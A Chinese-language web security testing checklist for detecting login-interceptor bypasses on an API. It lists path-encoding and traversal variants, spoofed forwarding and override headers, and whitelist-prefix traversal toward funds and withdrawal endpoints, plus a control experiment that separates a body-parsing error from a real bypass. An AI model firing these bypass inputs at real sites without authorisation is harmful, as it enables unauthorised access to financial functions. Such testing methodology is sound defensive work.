# 目的
判定“统一返回未登录（业务码 20000）”的站点是否存在拦截器解析差异绕过，
并避免把“请求体解析错误码”误判成绕过。

# 0) 先确定基线语义
无 Cookie 打一个“必然需要登录”的接口，记录其拦截响应（本例 code=20000, message=未登录或登录已失效）。
判据：响应 code 只要不是该拦截码，就是走到了业务层（=疑似绕过）。

# 1) 路径变体（各 1 次，间隔 1.3s+）
/api/./X  /api//X  /api/X/  /API/X  /api/X(大小写)  /api/X;.json  /api/X;
/api/X%20  /api/X%00  /api/X%09  /api/X/../X  /api/y/../X  /api/%77ithdrawl
/api/X?q=1  /api/X/.json  /api/X.action  /api/X;jsessionid=1  /api/X%2f  /api/%2e/X

# 2) 头部 / 方法
X-HTTP-Method-Override: POST、X-Original-URL、X-Rewrite-URL、
X-Forwarded-For/X-Real-IP/X-Client-IP/Forwarded/True-Client-IP/CF-Connecting-IP = 127.0.0.1、
X-Forwarded-Host/Proto/Prefix、Referer: /admin、Authorization: Bearer null、
body 里 _method=POST、GET/OPTIONS/PUT/PATCH。

# 3) 白名单前缀 + 穿越（最关键，最容易漏）
先用无 Cookie 找出**真实匿名可达**的接口（本例：/api/queryHomePageInitialization、
/api/queryDeposit、/api/queryHeadPictureList、/api/getCountriesDialingCode、
/api/mobileValidateCodeNew），再把它们当 startsWith 白名单前缀去穿越：
/api/<anon>/../资金接口、/api/<anon>/..%2f资金接口、/api/<anon>%2f..%2f资金接口、
/api//<anon>/../资金接口、/api/<anon>/%2e%2e/资金接口。

# 4) 归因控制实验（**必做**，否则极易误报）
固定 body 交叉 Content-Type，找出真正触发差异的变量：
  CT=application/json            body=a=1   -> ?
  CT=application/json            body={}    -> ?
  CT=text/plain                  body=a=1   -> ?
  CT=text/plain                  body={}    -> ?
  CT=application/x-www-form-urlencoded body=a=1 -> ?
  CT=application/xml             body={}    -> ?
example.com 实测：非 20000 的 116「参数错误」只由 **body 不是合法 JSON** 触发，
与 CT 无关（CT 换成 text/plain/xml 但 body 为合法 JSON 时一律回到 20000）
→ 结论是“鉴权判定之前存在一层 JSON body 解析”，**不是拦截器绕过**。
